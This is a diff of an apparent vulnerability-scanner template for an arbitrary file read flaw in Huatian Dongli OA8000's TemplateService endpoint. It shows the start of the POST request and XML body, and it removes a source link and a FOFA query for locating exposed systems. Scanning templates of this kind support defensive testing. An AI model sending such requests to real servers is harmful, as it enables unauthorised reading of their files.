@@ -3,20 +3,14 @@ info:
   name: 华天动力 OA TemplateService 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kvlnbfb8feg4h50t'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kvlnbfb8feg4h50t
-    fofa: app="华天动力-OA8000"
 http:
 - raw:
   - 'POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
 
 
     Content-Type: text/xml
-
-
 
 
     <buffalo-call>
